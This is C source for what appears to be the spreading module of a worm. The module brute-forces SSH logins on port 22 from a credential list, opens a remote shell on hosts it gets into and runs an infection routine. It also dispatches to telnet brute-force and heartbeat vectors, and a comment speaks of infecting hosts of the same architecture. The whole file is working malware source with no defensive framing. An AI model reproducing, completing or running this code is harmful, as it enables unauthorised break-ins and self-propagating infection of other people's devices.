static void bne_vssh_discon (
	bne_vssh_ctx_t *vs,
	const struct timespec *to,
	const int reason,
	const char *desc)
{
	pth_event_t ev = NULL;

	if (vs->ss == NULL) {
		return;
	}

	prne_pth_reset_timer(&ev, to);
	prne_lssh2_discon(vs->ss, vs->fd, reason, desc, "", ev);
	pth_event_free(ev, FALSE);
}

static void bne_vssh_drop_conn (bne_vssh_ctx_t *vs) {
	prne_shutdown(vs->fd, SHUT_RDWR);

	prne_free(vs->auth_list);
	vs->auth_list = NULL;
	prne_lssh2_free_session(vs->ss);
	vs->ss = NULL;
	prne_close(vs->fd);
	vs->fd = -1;
}

static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	int f_ret;
	pth_event_t ev = NULL;
	const struct timespec *pause = NULL;
	prne_net_endpoint_t ep;

	if (vs->ss != NULL) {
		return true;
	}

	ep.addr = ctx->param.subject;

	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
		bne_port_t *p = (bne_port_t*)vs->ports.head->element;

		ep.port = p->port;

		if (pause != NULL) {
			pth_nanosleep(pause, NULL);
			pause = NULL;
		}
		bne_vssh_drop_conn(vs);
		p->attempt += 1;

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
			prne_dbgpf(
				"bne vssh@%"PRIxPTR"\t: knocking %"PRIu16"\n",
				(uintptr_t)ctx,
				p->port);
		}

		prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
		if (!bne_do_connect(&vs->fd, &ep, ev)) {
			ctx->result.err = errno;
			goto END;
		}
		if (vs->fd < 0) {
			pause = &BNE_ERR_PAUSE;
			if (p->attempt >= BNE_CONN_ATTEMPT) {
				goto POP;
			}
			continue;
		}

		vs->ss = libssh2_session_init();
		if (vs->ss == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		libssh2_session_set_blocking(vs->ss, 0);

		f_ret = prne_lssh2_handshake(vs->ss, vs->fd, ev);
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne vssh@%"PRIxPTR"\t: handshake %d on port %"PRIu16"\n",
				(uintptr_t)ctx,
				f_ret,
				ep.port);
		}
		if (f_ret == 0) {
			ctx->result.err = 0;
			ret = true;
			break;
		}
		/* fall-through */
POP:
		// try next port
		prne_free(p);
		prne_llist_erase(&vs->ports, vs->ports.head);
	}

END:
	if (ev != NULL && pth_event_status(ev) == PTH_STATUS_OCCURRED) {
		ctx->result.err = ETIMEDOUT;
	}
	pth_event_free(ev, FALSE);
	if (!ret) {
		bne_vssh_drop_conn(vs);
	}

	return ret;
}

static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	pth_event_t ev = NULL;
	int f_ret;

	while (true) {
		if (ctx->param.login_attempt > 0 &&
			vs->login_cnt > ctx->param.login_attempt)
		{
			break;
		}

		if (!bne_vssh_est_sshconn(ctx, vs)) {
			break;
		}

		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			if (!bne_pop_cred(ctx, true)) {
				break;
			}
			if (ctx->result.cred.id == NULL) {
				// have to try different ID
				bne_vssh_discon(
					vs,
					&BNE_CLOSE_OP_TIMEOUT,
					SSH_DISCONNECT_BY_APPLICATION,
					"this ain't over!");
				bne_vssh_drop_conn(vs);
				continue;
			}
		}

		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		if (vs->auth_list == NULL) {
			const char *tmp = prne_lssh2_ua_list(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ev,
				NULL);

			if (tmp != NULL) {
				const size_t len = strlen(tmp);

				vs->auth_list = prne_alloc_str(len);
				if (vs->auth_list == NULL) {
					ctx->result.err = errno;
					break;
				}
				memcpy(vs->auth_list, tmp, len + 1);
				prne_transcstr(vs->auth_list, prne_ctolower);
			}
			else if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
		}

		f_ret = prne_lssh2_ua_authd(vs->ss, vs->fd, ev);
		if (f_ret < 0) {
			bne_vssh_drop_conn(vs);
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			continue;
		}

		if (f_ret == 0) {
			// need auth
			if (vs->auth_list != NULL &&
				strstr(vs->auth_list, "password") == NULL)
			{
				// but password auth not available for this account.
				// try next id
				goto NEXT_ID;
			}

			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
				prne_dbgpf(
					"bne vssh@%"PRIxPTR"\t: trying cred %s %s\n",
					(uintptr_t)ctx,
					ctx->result.cred.id,
					ctx->result.cred.pw);
			}

			prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
			f_ret = prne_lssh2_ua_pwd(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ctx->result.cred.pw,
				ev);
			vs->login_cnt += 1;
			if (f_ret == LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
/*
* server's not accepting the credentials that had been used for the
* first time
*/
				prne_free(ctx->result.cred.pw);
				ctx->result.cred.pw = NULL;
				continue;
			}
			if (f_ret != 0) {
				bne_vssh_drop_conn(vs);
				if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
					break;
				}
				continue;
			}
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne vssh@%"PRIxPTR"\t: authenticated using cred %s %s\n",
				(uintptr_t)ctx,
				ctx->result.cred.id,
				ctx->result.cred.pw);
		}

		// after auth, acquire shell
		do { // FAKE LOOP
			vs->ch_shell = prne_lssh2_open_ch(
				vs->ss,
				vs->fd,
				ev,
				NULL);
			if (vs->ch_shell == NULL) {
				break;
			}
#if 0 // without terminal
			if (prne_lssh2_ch_req_pty(
				vs->ss,
				vs->ch_shell,
				vs->fd,
				"vanilla",
				ev))
			{
				break;
			}
#endif
			f_ret = prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev);
			if (f_ret == 0) {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
					prne_dbgpf(
						"bne vssh@%"PRIxPTR"\t: shell opened\n",
						(uintptr_t)ctx);
				}
			}
			else {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
					prne_dbgpf(
						"bne vssh@%"PRIxPTR"\t: failed to open shell (%d)\n",
						(uintptr_t)ctx,
						f_ret);
				}
				break;
			}

			ret = true;
			ctx->result.err = 0;
		} while (false);
NEXT_ID:
		if (!ret) {
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			// credential worked, but could not open shell with this account
			bne_delete_cred_w_id(ctx, ctx->result.cred.id);
			bne_free_result_cred(ctx);
			bne_vssh_discon(
				vs,
				&BNE_CLOSE_OP_TIMEOUT,
				SSH_DISCONNECT_BY_APPLICATION,
				"this ain't over!");
			bne_vssh_drop_conn(vs);
			continue;
		}
		break;
	}

	pth_event_free(ev, FALSE);
	return ret;
}

static ssize_t bne_vssh_read_f (
	void *ctx_p,
	void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	size_t rem_size = buf_size;
	ssize_t ret = 0, f_ret;
	char *buf = (char*)buf_p;
	bool eof[2] = { false, false };
	int tmp;
	struct pollfd pfd;

	pfd.fd = ctx->fd;
	while (true) {
		f_ret = libssh2_channel_read_stderr(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[0] = true;
		}

		if (ret > 0) {
/* Prioritise process of stderr data first to swiftly break from the normal
* flow. It also helps to intentionally congest the stdout buffer so that the
* process blocks on write() call.
*/
			break;
		}

		f_ret = libssh2_channel_read(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[1] = true;
		}

		if (ret > 0 || (eof[0] && eof[1])) {
			break;
		}

		tmp = libssh2_session_block_directions(ctx->ss);
		pfd.events = 0;
		if (tmp & LIBSSH2_SESSION_BLOCK_INBOUND) {
			pfd.events |= POLLIN;
		}
		if (tmp & LIBSSH2_SESSION_BLOCK_OUTBOUND) {
			pfd.events |= POLLOUT;
		}

		tmp = prne_pth_poll(&pfd, 1, -1, ev);
		if (tmp <= 0) {
			ret = -1;
			break;
		}
	}

	return ret;
}

static ssize_t bne_vssh_write_f (
	void *ctx_p,
	const void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	int f_ret;
	size_t rem = buf_size;
	size_t sent = 0;

	while (rem > 0) {
		f_ret = prne_lssh2_ch_write(
			ctx->ss,
			ctx->ch_shell,
			ctx->fd,
			buf_p,
			rem,
			ev);
		if (f_ret < 0) {
			return f_ret;
		}
		if (f_ret == 0) {
			return sent;
		}

		buf_p = (const uint8_t*)buf_p + f_ret;
		rem -= f_ret;
		sent += f_ret;
	}

	return sent;
}

static bool bne_vssh_flush_f (void *ctx_p) {
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	int f_ret;

	f_ret = libssh2_channel_flush_ex(ctx->ch_shell, LIBSSH2_CHANNEL_FLUSH_ALL);

	if (f_ret >= 0) {
		return true;
	}
	if (f_ret < 0 && f_ret == LIBSSH2_ERROR_EAGAIN) {
		return true;
	}
	return false;
}

static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bne_sh_ctx_t sh_ctx;
	bool ret;

	bne_init_sh_ctx(&sh_ctx, &ctx->rnd);
	sh_ctx.ctx = vs;
	sh_ctx.read_f = bne_vssh_read_f;
	sh_ctx.write_f = bne_vssh_write_f;
	sh_ctx.flush_f = bne_vssh_flush_f;
	sh_ctx.nl = "\n";

	// TODO: try exec cat command on a separate channel, write() binary directly
	ret = bne_do_shell(ctx, &sh_ctx);

	bne_free_sh_ctx(&sh_ctx);
	return ret;
}

static bool bne_do_vec_ssh (prne_bne_t *ctx) {
	static const uint16_t SSH_PORTS[] = { 22 };
	bool ret = false;
	bne_vssh_ctx_t vssh_ctx;

	prne_memzero(&vssh_ctx, sizeof(bne_vssh_ctx_t));
	vssh_ctx.fd = -1;
	prne_init_llist(&vssh_ctx.ports);

	bne_free_result_cred(ctx);

	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);

		if (p == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		p->port = SSH_PORTS[i];

		if (!prne_llist_append(
			&vssh_ctx.ports,
			(prne_llist_element_t)p))
		{
			prne_free(p);
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_build_cred_set(ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_vssh_login(ctx, &vssh_ctx)) {
		goto END;
	}

	// `ctx->result.cred` must be set at this point
	ret = bne_vssh_do_shell(ctx, &vssh_ctx);
	if (ret) {
		pth_event_t ev = NULL;

		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		// close the channel and wait for the remote end to do the same
		// this ensures that the issued commands are completed
		prne_lssh2_close_ch(
			vssh_ctx.ss,
			vssh_ctx.ch_shell,
			vssh_ctx.fd,
			ev);
		prne_lssh2_ch_wait_closed(
			vssh_ctx.ss,
			vssh_ctx.ch_shell,
			vssh_ctx.fd,
			ev);

		pth_event_free(ev, FALSE);
	}

END:
	bne_vssh_discon(
		&vssh_ctx,
		&BNE_CLOSE_OP_TIMEOUT,
		SSH_DISCONNECT_BY_APPLICATION,
		"thank you");
	bne_vssh_drop_conn(&vssh_ctx);
	for (prne_llist_entry_t *e = vssh_ctx.ports.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_free_llist(&vssh_ctx.ports);

	return ret;
}

/*******************************************************************************
                                  Extern Impl
*******************************************************************************/
static void bne_free_ctx_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;

	if (ctx == NULL) {
		return;
	}

	prne_free_iset(&ctx->cred_set);
	prne_free_rnd(&ctx->rnd);
	prne_free_bne_param(&ctx->param);
	bne_free_result_cred(ctx);
	prne_free(ctx);
}

static void bne_fin_f (void *p) {
	// do nothing
}

static void *bne_entry_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;
	bool f_ret;

	for (size_t i = 0; i < ctx->param.vector.cnt; i += 1) {
		switch (ctx->param.vector.arr[i]) {
		case PRNE_BNE_V_HTBT:
			f_ret = bne_do_vec_htbt(ctx);
			break;
		case PRNE_BNE_V_BRUTE_TELNET:
			f_ret = bne_do_vec_telnet(ctx);
			break;
		case PRNE_BNE_V_BRUTE_SSH:
			f_ret = bne_do_vec_ssh(ctx);
			break;
		}

		if (f_ret) {
			ctx->result.vec = ctx->param.vector.arr[i];
			break;
		}
	}

	return &ctx->result;
}

void prne_init_bne_param (prne_bne_param_t *p) {
	prne_memzero(p, sizeof(prne_bne_param_t));
}

void prne_free_bne_param (prne_bne_param_t *p) {}

const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
	switch (v) {
	case PRNE_BNE_V_HTBT: return "htbt";
	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
	}
	errno = EINVAL;
	return NULL;
}

prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param)
{
	prne_bne_t *ret = NULL;
	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];

	if (ctr_drbg == NULL ||
		param->cb.exec_name == NULL ||
		param->rcb == NULL)
		/* The instance will only be able to infect hosts with same arch without
		bin archive. */
		// param->rcb->ba == NULL ||
	{
		errno = EINVAL;
		return NULL;
	}

// TRY
	ret = (prne_bne_t*)prne_calloc(sizeof(prne_bne_t), 1);
	if (ret == NULL) {
		goto ERR;
	}
	prne_init_iset(&ret->cred_set);
	prne_init_bne_param(&ret->param);
	prne_init_rnd(&ret->rnd);

	if (mbedtls_ctr_drbg_random(ctr_drbg, seed, sizeof(seed)) != 0) {
		goto ERR;
	}
	if (!prne_rnd_alloc_well512(&ret->rnd, seed)) {
		goto ERR;
	}

	ret->param = *param;

	ret->result.subject = &ret->param.subject;
	ret->result.vec = PRNE_BNE_V_NONE;

	w->ctx = ret;
	w->entry = bne_entry_f;
	w->fin = bne_fin_f;
	w->free_ctx = bne_free_ctx_f;
	return ret;
ERR: // CATCH
	if (ret != NULL) {
		bne_free_ctx_f(ret);
		ret = NULL;
	}

	return NULL;
}

const prne_ip_addr_t *prne_bne_get_subject (const prne_bne_t *bne) {
	return bne->result.subject;
}
